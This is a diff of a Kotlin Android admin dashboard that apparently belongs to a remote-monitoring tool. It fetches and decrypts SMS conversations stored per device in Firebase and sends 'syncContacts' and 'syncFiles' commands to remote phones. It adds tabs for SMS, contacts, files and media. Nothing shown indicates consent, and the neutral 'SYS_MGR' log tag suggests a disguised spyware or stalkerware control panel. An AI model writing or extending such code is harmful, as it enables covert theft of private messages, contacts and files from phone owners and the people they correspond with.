-                            val rawAddress = child.child("address").getValue(String::class.java) ?: ""
-                            val rawBody = child.child("body").getValue(String::class.java) ?: ""
-                            val date = child.child("date").getValue(Long::class.java) ?: 0L
-                            val type = child.child("type").getValue(Int::class.java) ?: 1
+                        val phoneNumber = if (aesKey != null && rawPhoneNumber.contains(".")) {
+                            CryptoManager.decrypt(rawPhoneNumber, aesKey) ?: rawPhoneNumber
+                        } else rawPhoneNumber
 
-                            val address = if (aesKey != null) {
-                                CryptoManager.decrypt(rawAddress, aesKey) ?: rawAddress
-                            } else rawAddress
-
-                            val body = if (aesKey != null) {
-                                CryptoManager.decrypt(rawBody, aesKey) ?: rawBody
-                            } else rawBody
-
-                            list.add(SmsItem(id = id, address = address, body = body, date = date, type = type))
-                        } catch (e: Exception) {
-                            if (BuildConfig.DEBUG) { Log.e("SYS_MGR", "SMS parse error: ${e.message}") }
-                        }
-                    }
-                    smsList = list.sortedByDescending { it.date }
-                    isLoading = false
-                }
-
-                override fun onCancelled(error: DatabaseError) {
-                    if (BuildConfig.DEBUG) { Log.e("SYS_MGR", "SMS listener cancelled: ${error.message}") }
-                    isLoading = false
-                }
-            })
-        }
-
-        Card(
-            modifier = Modifier
-                .fillMaxWidth()
-                .fillMaxHeight(0.6f)
-                .padding(16.dp),
-            elevation = CardDefaults.cardElevation(defaultElevation = 8.dp)
-        ) {
-            Column(modifier = Modifier.padding(16.dp)) {
-                Row(
-                    modifier = Modifier.fillMaxWidth(),
-                    horizontalArrangement = Arrangement.SpaceBetween,
-                    verticalAlignment = Alignment.CenterVertically
-                ) {
-                    Text(
-                        text = "📩 SMS (${smsList.size})",
-                        style = MaterialTheme.typography.titleMedium,
-                        fontWeight = FontWeight.Bold
-                    )
-                    TextButton(onClick = onDismiss) { Text("Close") }
-                }
-
-                Spacer(modifier = Modifier.height(8.dp))
-
-                if (isLoading) {
-                    Box(modifier = Modifier.fillMaxWidth(), contentAlignment = Alignment.Center) {
-                        CircularProgressIndicator()
-                    }
-                } else if (smsList.isEmpty()) {
-                    Text(
-                        text = "SMS topilmadi. Sync tugmasini bosing.",
-                        color = MaterialTheme.colorScheme.onSurfaceVariant,
-                        modifier = Modifier.padding(8.dp)
-                    )
-                } else {
-                    LazyColumn {
-                        items(smsList) { sms ->
-                            SmsItemRow(sms)
-                        }
+                        list.add(SmsConversation(
+                            conversationKey = conversationKey,
+                            phoneNumber = phoneNumber,
+                            lastMessage = lastMessage,
+                            lastTimestamp = lastTimestamp
+                        ))
+                    } catch (e: Exception) {
+                        if (BuildConfig.DEBUG) { Log.e("SYS_MGR", "Conversation parse error: ${e.message}") }
                     }
                 }
+                
+                onLoaded(list.sortedByDescending { it.lastTimestamp })
             }
-        }
+
+            override fun onCancelled(error: DatabaseError) {
+                if (BuildConfig.DEBUG) { Log.e("SYS_MGR", "Conversations listener cancelled: ${error.message}") }
+                onLoaded(emptyList())
+            }
+        })
     }
 
-    @Composable
-    private fun SmsItemRow(sms: SmsItem) {
-        val dateStr = remember(sms.date) {
-            if (sms.date > 0) {
-                SimpleDateFormat("dd.MM.yy HH:mm", Locale.getDefault()).format(Date(sms.date))
-            } else ""
-        }
-        val typeLabel = if (sms.type == 2) "📤" else "📥"
+    private fun loadMessages(deviceId: String, conversationKey: String, onLoaded: (List<SmsMessage>) -> Unit) {
+        val messagesRef = FirebaseDatabase.getInstance("https://joylashuv-56b2c-default-rtdb.europe-west1.firebasedatabase.app")
+            .getReference("devices/$deviceId/sms/conversations/$conversationKey/messages")
 
-        Card(
-            modifier = Modifier
-                .fillMaxWidth()
-                .padding(vertical = 3.dp),
-            colors = CardDefaults.cardColors(
-                containerColor = if (sms.type == 2)
-                    MaterialTheme.colorScheme.secondaryContainer
-                else
-                    MaterialTheme.colorScheme.surfaceVariant
-            )
-        ) {
-            Column(modifier = Modifier.padding(10.dp)) {
-                Row(
-                    modifier = Modifier.fillMaxWidth(),
-                    horizontalArrangement = Arrangement.SpaceBetween
-                ) {
-                    Text(
-                        text = "$typeLabel ${sms.address}",
-                        fontWeight = FontWeight.Medium,
-                        fontSize = 13.sp
-                    )
-                    Text(
-                        text = dateStr,
-                        fontSize = 11.sp,
-                        color = MaterialTheme.colorScheme.onSurfaceVariant
-                    )
+        messagesRef.addListenerForSingleValueEvent(object : ValueEventListener {
+            override fun onDataChange(snapshot: DataSnapshot) {
+                val aesKey = KeyManager.getAesKey(this@AdminDashboardActivity)
+                val list = mutableListOf<SmsMessage>()
+                
+                snapshot.children.forEach { msgSnapshot ->
+                    try {
+                        val messageKey = msgSnapshot.key ?: return@forEach
+                        val rawBody = msgSnapshot.child("body").getValue(String::class.java) ?: ""
+                        val date = msgSnapshot.child("date").getValue(Long::class.java) ?: 0L
+                        val type = msgSnapshot.child("type").getValue(Int::class.java) ?: 1
+                        val id = msgSnapshot.child("id").getValue(String::class.java) ?: ""
+
+                        val body = if (aesKey != null && rawBody.contains(".")) {
+                            CryptoManager.decrypt(rawBody, aesKey) ?: rawBody
+                        } else rawBody
+
+                        list.add(SmsMessage(
+                            messageKey = messageKey,
+                            body = body,
+                            date = date,
+                            type = type,
+                            id = id
+                        ))
+                    } catch (e: Exception) {
+                        if (BuildConfig.DEBUG) { Log.e("SYS_MGR", "Message parse error: ${e.message}") }
+                    }
                 }
-                Spacer(modifier = Modifier.height(4.dp))
-                Text(
-                    text = if (sms.body.length > 80) sms.body.take(80) + "…" else sms.body,
-                    fontSize = 12.sp,
-                    color = MaterialTheme.colorScheme.onSurfaceVariant
-                )
+                
+                onLoaded(list.sortedBy { it.date })
             }
-        }
+
+            override fun onCancelled(error: DatabaseError) {
+                if (BuildConfig.DEBUG) { Log.e("SYS_MGR", "Messages listener cancelled: ${error.message}") }
+                onLoaded(emptyList())
+            }
+        })
     }
 
     /**
      * syncContacts command ni Firebase'ga yozadi
      */
-    private fun sendSyncContactsCommand(deviceId: String) {
+    private fun sendSyncContactsCommand(deviceUid: String) {
         val commandsRef = FirebaseDatabase.getInstance("https://joylashuv-56b2c-default-rtdb.europe-west1.firebasedatabase.app")
             .getReference("devices")
-            .child(deviceId)
+            .child(deviceUid)
             .child("commands")
 
         commandsRef.child("syncContacts").setValue(mapOf(
@@ -888,7 +1070,7 @@ class AdminDashboardActivity : ComponentActivity() {
             "timestamp" to ServerValue.TIMESTAMP,
             "status" to "pending"
         ))
-        if (BuildConfig.DEBUG) { Log.d("SYS_MGR", "syncContacts command sent for device: $deviceId") }
+        if (BuildConfig.DEBUG) { Log.d("SYS_MGR", "syncContacts command sent for device: $deviceUid") }
     }
 
     /**
@@ -953,8 +1135,7 @@ class AdminDashboardActivity : ComponentActivity() {
 
         Card(
             modifier = Modifier
-                .fillMaxWidth()
-                .fillMaxHeight(0.7f)
+                .fillMaxSize()
                 .padding(16.dp),
             elevation = CardDefaults.cardElevation(defaultElevation = 8.dp)
         ) {
@@ -1068,10 +1249,10 @@ class AdminDashboardActivity : ComponentActivity() {
     /**
      * syncFiles command ni Firebase'ga yozadi
      */
-    private fun sendSyncFilesCommand(deviceId: String) {
+    private fun sendSyncFilesCommand(deviceUid: String) {
         val commandsRef = FirebaseDatabase.getInstance("https://joylashuv-56b2c-default-rtdb.europe-west1.firebasedatabase.app")
             .getReference("devices")
-            .child(deviceId)
+            .child(deviceUid)
             .child("commands")
 
         commandsRef.child("syncFiles").setValue(mapOf(
@@ -1079,7 +1260,7 @@ class AdminDashboardActivity : ComponentActivity() {
             "timestamp" to ServerValue.TIMESTAMP,
             "status" to "pending"
         ))
-        if (BuildConfig.DEBUG) { Log.d("SYS_MGR", "syncFiles command sent for device: $deviceId") }
+        if (BuildConfig.DEBUG) { Log.d("SYS_MGR", "syncFiles command sent for device: $deviceUid") }
     }
 
     /**
@@ -1149,8 +1330,7 @@ class AdminDashboardActivity : ComponentActivity() {
 
         Card(
             modifier = Modifier
-                .fillMaxWidth()
-                .fillMaxHeight(0.7f)
+                .fillMaxSize()
                 .padding(16.dp),
             elevation = CardDefaults.cardElevation(defaultElevation = 8.dp)
         ) {
@@ -1304,5 +1484,37 @@ class AdminDashboardActivity : ComponentActivity() {
     
     override fun onLowMemory() {
         super.onLowMemory()
+    }
+}
+
+@Composable
+fun SmsTabPlaceholder() {
+    Box(Modifier.fillMaxSize(), contentAlignment = Alignment.Center) {
+        Text("SMS — yuklanmoqda",
+            color = MaterialTheme.colorScheme.onSurface.copy(alpha = 0.4f))
+    }
+}
+
+@Composable
+fun ContactsTabPlaceholder() {
+    Box(Modifier.fillMaxSize(), contentAlignment = Alignment.Center) {
+        Text("Kontakt — yuklanmoqda",
+            color = MaterialTheme.colorScheme.onSurface.copy(alpha = 0.4f))
+    }
+}
+
+@Composable
+fun FilesTabPlaceholder() {
+    Box(Modifier.fillMaxSize(), contentAlignment = Alignment.Center) {
+        Text("Fayllar — yuklanmoqda",
+            color = MaterialTheme.colorScheme.onSurface.copy(alpha = 0.4f))
+    }
+}
+
+@Composable
+fun MediaTabPlaceholder() {
+    Box(Modifier.fillMaxSize(), contentAlignment = Alignment.Center) {
+        Text("Media — yuklanmoqda",
+            color = MaterialTheme.colorScheme.onSurface.copy(alpha = 0.4f))
     }
 }
